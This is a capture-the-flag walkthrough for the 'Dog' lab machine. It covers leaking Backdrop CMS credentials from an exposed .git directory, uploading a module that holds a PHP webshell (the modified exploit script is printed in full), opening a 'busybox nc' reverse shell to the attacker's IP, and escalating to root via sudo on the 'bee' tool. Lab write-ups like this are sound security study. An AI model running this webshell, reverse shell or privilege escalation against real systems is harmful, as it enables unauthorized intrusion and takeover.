# Dog - Easy

```sh
sudo vim /etc/hosts
# add dog.htb

nmap -T4 -p- -A -Pn -v dog.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
    * 80/tcp - http - Apache httpd 2.4.41

* ```nmap``` shows that the webpage has a '/robots.txt' file with several entries, and a '/.git' directory is also found

* the webpage on port 80 is a blog page about dogs, and includes a few posts; the author names of the posts include 'dogBackDropSystem' and 'Anonymous'

* the page footer shows that the page is using BackDrop CMS; and the page source code shows the directory '/files', where multiple files are hosted

* the webpage also includes links to an about section at 'http://dog.htb/?q=about', which discloses the email 'support@dog.htb'

* there is a login page as well at 'http://dog.htb/?q=user/login'; this page also includes an option for 'reset password' at 'http://dog.htb/?q=user/password'

* the '/robots.txt' file has several disallowed entries - the ones that we are able to access include:

    * /core
    * /README.md

* searching for any clues in these directories and the '/files' directory found earlier does not give anything at the moment

* we can check for any secrets in the '.git' directory found - we can use the ```git-dumper``` tool:

    ```sh
    git-dumper http://dog.htb/.git .
    # fetches all files

    git log
    # shows a single commit by 'root'

    # check the files and enumerate for any clues

    ls -la

    less settings.php
    # gives DB creds
    ```

* from the 'settings.php' in the webroot directory, we get the creds "root:BackDropJ2024DS2024" for the MySQL DB; using these creds for SSH login fails

* attempting to login into the CMS login page as 'root', 'admin', 'dogBackDropSystem' and 'Anonymous' using this password fails

* we can search for more secrets in the repository:

    ```sh
    grep -rnwiIe "PASSW\|PASSWD\|PASSWORD\|PWD" .
    # search for password strings

    grep -rnwiIe "root" .
    # search for other common strings

    grep -rnwiIe "dog.htb" .
    # search for the email id
    ```

* searching for the email address 'dog.htb' gives us another username 'tiffany@dog.htb' from the file ```/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json```

* if we try to login as 'tiffany' using the password found earlier in the website login, it works and we are able to access the dashboard

* we can enumerate the website dashboard for any secrets or ways to get a foothold

* checking user accounts at 'http://dog.htb/?q=admin/people/list' gives us the following list of usernames - all of them have 'Administrator' roles:

    * tiffany
    * rosa
    * axel
    * morris
    * john
    * dogBackDropSystem
    * jobert
    * jPAdminB

* we can check the BackDrop CMS version by navigating to Reports > Status report, or checking Functionality > List modules - both of them show that we are on version 1.27.1

* Googling for exploits associated with "BackDrop CMS 1.27.1" leads to multiple exploits for authenticated RCE

* we can check [this exploit out](https://www.exploit-db.com/exploits/52021):

    * firstly, we need to run the exploit to generate the payload:

        ```sh
        python3 52021.py http://dog.htb
        ```
    
    * this generates the malicious module 'shell.zip'

    * following the exploit instructions, navigate to the module installation path at 'http://dog.htb/?q=admin/modules/install', and click on 'Manual installation'

    * next, select the option 'Upload a module, theme, or layout archive to install' and upload the 'shell.zip' file

    * this gives an error as the upload functionality only allows these extensions - 'tar', 'tgz', 'gz', 'bz2'

* as the module file upload does not support zip files, we need to edit the exploit such that the shell is archived into any of the supported extensions

* we can edit the functions and clean out the exploit script in this way:

    ```py
    import os
    import time
    import tarfile

    def create_files():
        info_content = """
        type = module
        name = Block
        description = Controls the visual building blocks a page is constructed
        with. Blocks are boxes of content rendered into an area, or region, of a
        web page.
        package = Layouts
        tags[] = Blocks
        tags[] = Site Architecture
        version = BACKDROP_VERSION
        backdrop = 1.x

        configure = admin/structure/block

        ; Added by Backdrop CMS packaging script on 2024-03-07
        project = backdrop
        version = 1.27.1
        timestamp = 1709862662
        """
        shell_info_path = "shell/shell.info"
        os.makedirs(os.path.dirname(shell_info_path), exist_ok=True)  # Klasörüoluşturur
        with open(shell_info_path, "w") as file:
            file.write(info_content)

        shell_content = """
        <html>
        <body>
        <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
        </form>
        <pre>
        <?php
        if(isset($_GET['cmd']))
        {
        system($_GET['cmd']);
        }
        ?>
        </pre>
        </body>
        </html>
        """
        shell_php_path = "shell/shell.php"
        with open(shell_php_path, "w") as file:
            file.write(shell_content)
        return shell_info_path, shell_php_path

    def create_tar(info_path, php_path):
        tar_filename = "shell.tar"
        with tarfile.open(tar_filename, 'w') as tarf:
            tarf.add(info_path, arcname='shell/shell.info')
            tarf.add(php_path, arcname='shell/shell.php')
        return tar_filename

    def main(url):
        print("Backdrop CMS 1.27.1 - Remote Command Execution Exploit")
        time.sleep(3)

        print("Evil module generating...")
        time.sleep(2)

        info_path, php_path = create_files()
        tar_filename = create_tar(info_path, php_path)

        print("Evil module generated!", tar_filename)
        time.sleep(2)

        print("Go to " + url + "/admin/modules/install and upload the " +
            tar_filename + " for Manual Installation.")
        time.sleep(2)

        print("Your shell address:", url + "/modules/shell/shell.php")

    if __name__ == "__main__":
        import sys
        if len(sys.argv) < 2:
            print("Usage: python script.py [url]")
        else:
            main(sys.argv[1])
    ```

* we can attempt the exploit again now:

    * run the exploit to generate 'shell.tar' - ```python3 52021.py http://dog.htb```

    * navigate to manual module installation option at 'http://dog.htb/?q=admin/installer/manual' and upload the tar file

    * this installs the module 'shell'

    * if we navigate to 'http://dog.htb/modules/shell/shell.php', we get the webshell

* using the webshell, we are able to get RCE; however the module gets deleted quickly, within minutes of installation

* we need to use the same procedure to upload the webshell again

* for reverse shell, setup a listener using ```nc -nvlp 4444```

* in the webshell, we can test various reverse shell one-liners; this payload works - ```busybox nc 10.10.14.9 4444 -e sh``` - and we get reverse shell:

    ```sh
    id
    # www-data

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    ls -la
    # no files, the shell module file gets deleted automatically
    # but we have RCE now

    ls -la /var/www/html
    # webroot

    ls -la /home
    # two users - 'jobert' and 'johncusack'

    ls -la /home/jobert
    # '.ssh' directory is present, but we cannot read its files

    ls -la /home/johncusack

    ls -la /
    # non-default directory 'backdrop_tool'

    ls -la /backdrop_tool

    ls -la /backdrop_tool/bee
    # check for secrets
    ```

* the root directory shows a non-default directory for 'backdrop_tool', which includes a sub-directory for its ```bee``` tool

* the ```bee``` folder contains a lot of files, but does not disclose any creds or secrets

* before checking the MySQL DB for any hashes next, we can attempt password re-use for these two users, via SSH:

    ```sh
    ssh jobert@dog.htb
    # does not work

    ssh johncusack@dog.htb
    # this works

    cat user.txt
    # user flag

    sudo -l
    # (ALL : ALL) /usr/local/bin/bee
    ```

* ```sudo -l``` shows that we can run ```/usr/local/bin/bee``` as sudo

* checking [GTFObins](https://gtfobins.org/gtfobins/bee/) for any exploits associated with ```bee``` gives us a hit

* as mentioned, we need to run the given command from the BackDrop CMS root directory, and any PHP code can be run using the 'eval' function:

    ```sh
    cd /var/www/html

    sudo /usr/local/bin/bee eval 'system("/bin/sh")'
    # this works

    id
    # root

    cat /root/root.txt
    # root flag
    ```
